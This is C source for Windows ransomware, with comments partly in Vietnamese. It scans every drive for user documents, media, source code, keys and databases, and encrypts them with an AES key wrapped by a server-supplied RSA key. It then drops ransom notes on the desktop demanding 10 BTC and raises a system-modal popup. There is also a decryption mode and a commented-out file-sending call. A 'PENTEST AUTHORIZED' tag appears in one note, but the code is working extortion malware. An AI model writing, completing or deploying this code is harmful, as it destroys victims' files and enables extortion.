#include "file_scan.h"
#include <stdio.h>
#include <windows.h>
#include <shlobj.h>        
#include <wincrypt.h>
#include <string.h>
#include <stdbool.h>
#include "crypto.h"
#include "file_steal.h"
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

char queue[8192][260];

const char* userExtensions[] = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".txt", ".rtf", ".csv",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".webp",
    ".mp3", ".wav", ".wma", ".flac", ".aac", ".ogg", ".m4a",
    ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".m4v",
    ".zip", ".rar", ".7z", ".tar", ".gz",
    ".c", ".cpp", ".h", ".js", ".ts", ".py", ".java", ".cs", ".php",
    ".html", ".css", ".xml", ".json", ".yaml", ".yml", ".sql",
    ".db", ".sqlite",
    ".psd", ".ai", ".dwg", ".dxf",
    ".pem", ".key",
    ".iso", ".vmdk", ".vdi", ".vhd",
    ".pst", ".ost", ".msg", ".eml"
};
DWORD WINAPI ShowRansomPopupThread(LPVOID lpParam) {
    // Đợi 2 giây để encryption hoàn tất và file được flush
    Sleep(2000);

    // --- TẠO FILE DESCRIPTION.TXT ---
    char desktopPath[MAX_PATH];
    char descPath[MAX_PATH];
    HANDLE hDesc;
    DWORD written;

    GetEnvironmentVariableA("USERPROFILE", desktopPath, MAX_PATH);
    strcat(desktopPath, "\\Desktop");

    _snprintf(descPath, MAX_PATH, "%s\\description.txt", desktopPath);

    const char* descMsg =
        "============================================\r\n"
        "   === YOUR FILES HAVE BEEN ENCRYPTED ===\r\n"
        "============================================\r\n"
        "\r\n"
        "What happened?\r\n"
        "All your important documents, photos, databases,\r\n"
        "and personal files have been encrypted with AES-128.\r\n"
        "They are now UNREADABLE without the decryption key.\r\n"
        "\r\n"
        "How to recover your files?\r\n"
        "You must pay a ransom of 10 BTC to the following address:\r\n"
        "   1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\r\n"
        "\r\n"
        "After payment, please contact us at:\r\n"
        "   pwned@tool.com\r\n"
        "\r\n"
        "In your email, include your Personal ID (located in the file\r\n"
        "DECRYPT_INSTRUCTIONS.txt on your Desktop).\r\n"
        "\r\n"
        "WARNING:\r\n"
        " - DO NOT attempt to decrypt files yourself\r\n"
        " - DO NOT use third-party recovery tools\r\n"
        " - DO NOT rename or modify encrypted files\r\n"
        " - Any of these actions may result in PERMANENT data loss\r\n"
        "\r\n"
        "You have 72 hours to make the payment.\r\n"
        "After that, the decryption key will be permanently destroyed.\r\n"
        "\r\n"
        "============================================\r\n"
        "           [ PENTEST AUTHORIZED ]\r\n"
        "============================================\r\n";

    hDesc = CreateFileA(descPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDesc != INVALID_HANDLE_VALUE) {
        WriteFile(hDesc, descMsg, strlen(descMsg), &written, NULL);
        CloseHandle(hDesc);
        printf("[OK] Created description.txt\n");
    } else {
        printf("[!] Failed to create description.txt (error %d)\n", GetLastError());
    }

    // --- POPUP MESSAGE BOX ---
    MessageBoxA(
        NULL,
        "YOUR FILES HAVE BEEN ENCRYPTED!\r\n\r\n"
        "All your documents, photos, databases and other important files\r\n"
        "have been encrypted.\r\n\r\n"
        "To recover your files, you must pay 10 BTC.\r\n\r\n"
        "See:\r\n"
        "  - DECRYPT_INSTRUCTIONS.txt (on Desktop)\r\n"
        "  - description.txt (on Desktop)\r\n"
        "for complete payment instructions.\r\n\r\n"
        "DO NOT attempt to decrypt files yourself!",
        "!!! SYSTEM LOCKED !!!",
        MB_OK | MB_ICONERROR |
        MB_SYSTEMMODAL | MB_TOPMOST | MB_SETFOREGROUND
    );

    return 0;
}

int isUserDataFile(const char* path) {
    const char* ext = strrchr(path, '.');
    if (!ext) return 0;
    
    char extLower[32];
    int i;
    for (i = 0; ext[i] && i < 31; i++) {
        extLower[i] = tolower(ext[i]);
    }
    extLower[i] = '\0';
    
    int count = sizeof(userExtensions) / sizeof(userExtensions[0]);
    for (i = 0; i < count; i++) {
        if (strcmp(extLower, userExtensions[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

void FileScan(bool decryptMode) {
    SOCKET socket;
    struct sockaddr_in socket_addr;

    HCRYPTPROV hProv;
    HCRYPTKEY hAesKey, hRsaKey;
    BYTE *keyBlob;
    BYTE *ivBlob;

    FILE *fptr;
    WIN32_FIND_DATA ffd;
    char scanPath[260];
    char path[260];
    char drives[256];
    int head = 0, tail = 0;
    size_t byteRead;
    unsigned char *buffer;
    
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD result = GetLogicalDriveStringsA(sizeof(drives), drives);
    if (result = 0) {
        printf("[!] Can't get drivers.");
        return;
    }
    char* drive = drives;
    ConnectionEstablish(&socket, &socket_addr);
    InitializeCrypto(&hProv, &hAesKey, &hRsaKey, &keyBlob);

    if (decryptMode) {
        DWORD idLen = 0;
        BYTE *id = LoadFromRegistry("id", &idLen);
        char *hexStr = (char*)malloc(idLen * 2 + 1);
        for (DWORD i = 0; i < idLen; i++) {
            sprintf(hexStr + (i * 2), "%02x", id[i]);
        }
        hexStr[idLen * 2] = '\0';
        printf("ID: %s\n", hexStr);
        char* privateKey = GetRSAKey((char*)hexStr);
        free(hexStr);
        free(id);
        hRsaKey = ImportRSAPrivateKey(privateKey, hProv);
        DWORD encryptedKeyLen = 256;
        BYTE *aesKeyBytes = LoadFromRegistry("EncryptedKey", &encryptedKeyLen);
        KeyDecrypt(&aesKeyBytes, hRsaKey);
        CryptDestroyKey(hAesKey);
        hAesKey = ImportAESKeyFromBlob(aesKeyBytes, 28, hProv);
        printf("Decrypt mode\n");
    } else {
        char* publicKey = GetRSAKey(NULL);
        hRsaKey = ImportRSAPublicKey(publicKey, hProv);
        printf("Public RSA key: %s\n", publicKey);
    }

    while (*drive != '\0') {
        printf("%s\n", drive);
        while (strcmp(drive, "C:\\") != 0) {
            drive += strlen(drive) + 1;
        }
        strcpy(queue[tail], drive);
        tail = (tail + 1) % 8192;
        while (tail != head) {
            char currentParentPath[260];
            strcpy(currentParentPath, queue[head]);
            head = (head + 1) % 8192;
            sprintf(scanPath, "%s*", currentParentPath);
            hFind = FindFirstFile(scanPath, &ffd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (strcmp(ffd.cFileName, "..") == 0 || strcmp(ffd.cFileName, ".") == 0) {
                        continue;
                    }                    
                    if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        if (strcmp(ffd.cFileName, "Windows") == 0 || 
                            strcmp(ffd.cFileName, "Program Files") == 0 || 
                            strcmp(ffd.cFileName, "Program Files (x86)") == 0 ||
                            strcmp(ffd.cFileName, "MinGW") == 0 ||
                            strcmp(ffd.cFileName, "AppData") == 0) {
                            continue;
                        }
                        sprintf(path, "%s%s\\", currentParentPath, ffd.cFileName);
                        strcpy(queue[tail], path);
                        tail = (tail + 1) % 8192;
                    } else {
                        sprintf(path, "%s%s", currentParentPath, ffd.cFileName);
                        if (!isUserDataFile(path)) continue;
                          long long fileSize = ((long long)ffd.nFileSizeHigh << 32 | ffd.nFileSizeLow);
                        if (decryptMode) {
                            FileDecrypt(path, hProv, hAesKey);
                        } else {
                            // FileSend(path, fileSize, socket);
                            FileEncrypt(path, hProv, hAesKey);
                        }
                        printf("[FILE] %s - %ld bytes\n", path, fileSize);
                    }
                } while (FindNextFile(hFind, &ffd) != 0);
            }
            FindClose(hFind);
        }
        head = tail = 0;
        drive += strlen(drive) + 1;
    }

    if (!decryptMode) {
        KeyEncrypt(&keyBlob, hRsaKey);

        char desktopPath[MAX_PATH];
        char notePath[MAX_PATH];
        HANDLE hNote;
        DWORD written;
        const char* ransomMsg = 
            "PWNEDDDDDDDDDDDDDDDDDDDDDDDDDDDDD!\r\n\r\n"
            "YOUR FILES HAVE BEEN ENCRYPTED!\r\n\r\n"
            "All your documents, photos, databases and other important files\r\n"
            "have been encrypted .\r\n\r\n"
            "To recover your files, you must pay 10 BTC to the following address:\r\n"
            "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\r\n\r\n"
            "After payment, contact us at: pwned@tool.com\r\n"
            "with your personal ID to receive the decryption tool.\r\n\r\n"
            "DO NOT attempt to decrypt files yourself or you may lose them permanently.\r\n";

        GetEnvironmentVariableA("USERPROFILE", desktopPath, MAX_PATH);
        strcat(desktopPath, "\\Desktop");
        
        _snprintf(notePath, MAX_PATH, "%s\\DECRYPT_INSTRUCTIONS.txt", desktopPath);
        
        hNote = CreateFileA(notePath, GENERIC_WRITE, 0, NULL, 
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hNote != INVALID_HANDLE_VALUE) {
            WriteFile(hNote, ransomMsg, strlen(ransomMsg), &written, NULL);
            CloseHandle(hNote);
        }

        // THAY MessageBox trực tiếp = CreateThread gọi hàm popup riêng
        CreateThread(NULL, 0, ShowRansomPopupThread, NULL, 0, NULL);
    } else {
        printf("Decrypt file successfully!\n");
    }
    FinalizeCrypto(&hProv, &hAesKey, &hRsaKey, &keyBlob);
    ConnectionClose(&socket);
    getchar();
}